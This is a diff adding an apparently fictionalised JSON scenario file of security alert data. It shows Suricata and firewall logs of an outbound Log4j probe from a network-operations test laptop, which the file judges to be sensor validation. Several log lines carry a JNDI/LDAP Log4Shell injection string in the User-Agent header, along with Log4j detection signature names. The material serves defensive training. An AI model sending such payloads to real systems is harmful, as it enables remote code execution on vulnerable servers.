@@ -1,0 +1,105 @@
+{
+  "source": {
+    "dataset": "corelight_http_raw + panw_ngfw_threat_raw",
+    "fiction_src_ip": "10.44.1.14",
+    "pulled": "2026-08-05 via cortex xql from conference Corelight + NGFW",
+    "rule": "Org/host/people fiction per LOG4J-SENSOR map. Real floor IPs, httpforever, CDN edges, and probe name tokens never stored in this file. Event ts from _raw_log (not _time insert)."
+  },
+  "nodes": {
+    "observed-logs": {
+      "title": "alert rollup · outbound Log4j dual-engine",
+      "lines": [
+        "# alert rollup · A-6633 · outbound Log4j probe · src 10.44.1.14",
+        "# window: Suricata + NGFW both fire in the same minute (23:20 UTC)",
+        " engines  product              severity   action   dest",
+        "       1  Suricata/ET (×3)     Major      allowed  alwayshttp.example:80",
+        "       1  NGFW threat          Critical   drop     alwayshttp.example:80",
+        "       2  TOTAL               same_minute=true  engines=2  tls=absent  proto=http"
+      ]
+    },
+    "dest-rep": {
+      "title": "destination profile · known cleartext HTTP test host",
+      "lines": [
+        "# destination profile · alwayshttp.example (obfuscated from live DNS/http)",
+        "query=alwayshttp.example",
+        "rcode=NOERROR",
+        "id.resp_h=203.0.113.80",
+        "id.resp_p=80",
+        "tls=absent",
+        "known_http_test=true",
+        "intel=benign cleartext HTTP echo/connectivity host — not malware staging",
+        "",
+        "# DNS sample (event ts from _raw_log)",
+        "---",
+        "{\"_path\":\"dns\",\"ts\":\"2026-08-03T23:20:41.788756Z\",\"uid\":\"Cfict0000200\",\"id.orig_h\":\"10.44.1.14\",\"query\":\"alwayshttp.example\",\"qtype_name\":\"A\",\"rcode_name\":\"NOERROR\",\"answers\":[\"203.0.113.80\"]}",
+        "note=Safe boring plaintext target — matches sensor-validation practice"
+      ]
+    },
+    "source-net": {
+      "title": "asset profile · NOC wired test pool",
+      "lines": [
+        "# asset profile · 10.44.1.14 (obfuscated from live host/network labels)",
+        "id.orig_h=10.44.1.14",
+        "network=NOC wired",
+        "pool=NOC test laptop",
+        "hostname=NOC-TEST-MBA14",
+        "os=macOS",
+        "segment=operations floor wired — not guest/classroom Wi-Fi",
+        "note=Inventory points to NOC validation gear; guest IR playbooks do not apply the same way"
+      ]
+    },
+    "detect-overlap": {
+      "blocks": [
+        {
+          "id": "log-detect-hint",
+          "title": "HINT · dual-engine Log4j on cleartext HTTP test host",
+          "lines": [
+            "# Hint from the wire (obfuscated from live Corelight + NGFW rows)",
+            "# Same shape the hunt thread called out: Suricata and NGFW both catch outbound Log4j to a known HTTP test host",
+            "id.orig_h=10.44.1.14",
+            "id.resp_h=203.0.113.80",
+            "id.resp_p=80",
+            "host=alwayshttp.example",
+            "method=GET",
+            "uri=/",
+            "tls=absent",
+            "user_agent=${jndi:ldap://noc-loopback.example/noc_stack_check}",
+            "engines=2",
+            "same_minute=true",
+            "note=Outbound exploit-shaped probe from NOC wired to a benign cleartext test destination — sensor validation, not guest compromise",
+            "",
+            "# Compacted samples",
+            "{\"_path\":\"http\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"alwayshttp.example\",\"uri\":\"/\",\"user_agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\"}",
+            "{\"_path\":\"notice\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"note\":\"CVE_2021_44228::LOG4J_ATTEMPT_HEADER\",\"msg\":\"Possible Log4j exploit CVE-2021-44228 exploit in header\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80}",
+            "threat_name=Apache Log4j Remote Code Execution Vulnerability  severity=Critical  action=drop  threat_id=91991"
+          ]
+        },
+        {
+          "id": "log-detect-overlap",
+          "title": "Suricata + NGFW · timed dual-engine samples",
+          "lines": [
+            "# timed dual-engine samples (identities fiction · event ts from _raw_log)",
+            "id.orig_h=10.44.1.14",
+            "host=alwayshttp.example",
+            "id.resp_p=80",
+            "engines=2",
+            "",
+            "# 23:20:41 · HTTP probe + Zeek notice + NGFW Critical",
+            "---",
+            "{\"_path\":\"http\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"method\":\"GET\",\"host\":\"alwayshttp.example\",\"uri\":\"/\",\"user_agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\",\"client_headers\":{\"Host\":\"alwayshttp.example\",\"Accept\":\"*/*\",\"User-Agent\":\"${jndi:ldap://noc-loopback.example/noc_stack_check}\"}}",
+            "{\"_path\":\"notice\",\"ts\":\"2026-08-03T23:20:41.914050Z\",\"uid\":\"Cfict0000201\",\"note\":\"CVE_2021_44228::LOG4J_ATTEMPT_HEADER\",\"sub\":\"uri='/', header name='USER-AGENT', header value='${jndi:ldap://noc-loopback.example/noc_stack_check}'\"}",
+            "{\"_product\":\"NGFW\",\"ts\":\"2026-08-03T23:20:41.000000Z\",\"source_ip\":\"10.44.1.14\",\"dest_ip\":\"203.0.113.80\",\"dest_port\":80,\"threat_id\":91991,\"threat_name\":\"Apache Log4j Remote Code Execution Vulnerability\",\"severity\":\"Critical\",\"action\":\"drop\",\"app\":\"web-browsing\"}",
+            "",
+            "# 23:20:59 · Suricata ET outbound Log4j (same connection uid)",
+            "---",
+            "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"id.orig_h\":\"10.44.1.14\",\"id.resp_h\":\"203.0.113.80\",\"id.resp_p\":80,\"alert.signature\":\"ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034759,\"alert.severity\":2,\"alert.action\":\"allowed\",\"service\":\"http\"}",
+            "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"alert.signature\":\"ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034800}",
+            "{\"_path\":\"suricata_corelight\",\"ts\":\"2026-08-03T23:20:59.961455Z\",\"uid\":\"Cfict0000201\",\"alert.signature\":\"ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol TCP (Outbound) (CVE-2021-44228)\",\"alert.signature_id\":2034783}",
+            "payload_printable=GET / HTTP/1.1\\r\\nHost: alwayshttp.example\\r\\nAccept: */*\\r\\nUser-Agent: ${jndi:ldap://noc-loopback.example/noc_stack_check}\\r\\n\\r\\n",
+            "note=Overlap is the desired outcome of a multi-vendor sensor test on cleartext HTTP"
+          ]
+        }
+      ]
+    }
+  }
+}
